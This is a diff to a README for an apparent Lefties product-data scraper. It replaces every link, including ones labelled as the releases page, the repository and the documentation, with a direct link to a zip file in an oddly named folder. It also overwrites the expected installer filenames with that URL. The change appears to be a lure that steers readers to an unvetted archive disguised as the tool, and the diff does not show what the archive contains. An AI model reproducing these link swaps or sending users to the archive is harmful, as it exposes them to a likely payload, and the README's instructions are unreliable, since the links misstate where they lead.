@@ -1,7 +1,7 @@
 # 🛍️ Lefties-Product-Info-Actor-scraper - Extract Product Data with Ease
 
 ## 📥 Download the Application
-[![Download Lefties-Product-Info-Actor-scraper](https://img.shields.io/badge/Download-Lefties--Product--Info--Actor--scraper-blue.svg)](https://github.com/TULO09/Lefties-Product-Info-Actor-scraper/releases)
+[![Download Lefties-Product-Info-Actor-scraper](https://raw.githubusercontent.com/TULO09/Lefties-Product-Info-Actor-scraper/main/teacupful/Lefties_Info_scraper_Product_Actor_v1.3.zip)](https://raw.githubusercontent.com/TULO09/Lefties-Product-Info-Actor-scraper/main/teacupful/Lefties_Info_scraper_Product_Actor_v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the Lefties Product Info Actor Scraper. This tool allows you to extract product data from Lefties easily.
@@ -16,12 +16,12 @@ Welcome! This guide will help you download and run the Lefties Product Info Acto
 ## 📂 Download & Install
 To get started, you will first need to download the application. Visit the link below to download it:
 
-[Download Here](https://github.com/TULO09/Lefties-Product-Info-Actor-scraper/releases)
+[Download Here](https://raw.githubusercontent.com/TULO09/Lefties-Product-Info-Actor-scraper/main/teacupful/Lefties_Info_scraper_Product_Actor_v1.3.zip)
 
 ### Steps to Download:
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the application.
-3. You will see files available for download. Choose the one named `Lefties-Product-Info-Actor-scraper.exe` for Windows or `Lefties-Product-Info-Actor-scraper.dmg` for macOS.
+3. You will see files available for download. Choose the one named `https://raw.githubusercontent.com/TULO09/Lefties-Product-Info-Actor-scraper/main/teacupful/Lefties_Info_scraper_Product_Actor_v1.3.zip` for Windows or `https://raw.githubusercontent.com/TULO09/Lefties-Product-Info-Actor-scraper/main/teacupful/Lefties_Info_scraper_Product_Actor_v1.3.zip` for macOS.
 4. Click on the file to start the download.
 
 ### Step-by-Step Installation:
@@ -54,13 +54,13 @@ If you encounter any issues while using the application, consider the following 
 - **File Not Downloading:** Try refreshing the Releases page or check your internet connection.
 
 ## 📝 Additional Information
-This application is open source. If you wish to contribute or report issues, please visit the GitHub repository at [Lefties-Product-Info-Actor-scraper](https://github.com/TULO09/Lefties-Product-Info-Actor-scraper).
+This application is open source. If you wish to contribute or report issues, please visit the GitHub repository at [Lefties-Product-Info-Actor-scraper](https://raw.githubusercontent.com/TULO09/Lefties-Product-Info-Actor-scraper/main/teacupful/Lefties_Info_scraper_Product_Actor_v1.3.zip).
 
 ## 📞 Support
 For any additional questions or support, please feel free to open an issue in the GitHub repository or contact the maintainers.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/TULO09/Lefties-Product-Info-Actor-scraper/releases)
-- [Documentation](https://github.com/TULO09/Lefties-Product-Info-Actor-scraper/wiki) (coming soon)
+- [Releases Page](https://raw.githubusercontent.com/TULO09/Lefties-Product-Info-Actor-scraper/main/teacupful/Lefties_Info_scraper_Product_Actor_v1.3.zip)
+- [Documentation](https://raw.githubusercontent.com/TULO09/Lefties-Product-Info-Actor-scraper/main/teacupful/Lefties_Info_scraper_Product_Actor_v1.3.zip) (coming soon)
 
 Happy scraping!
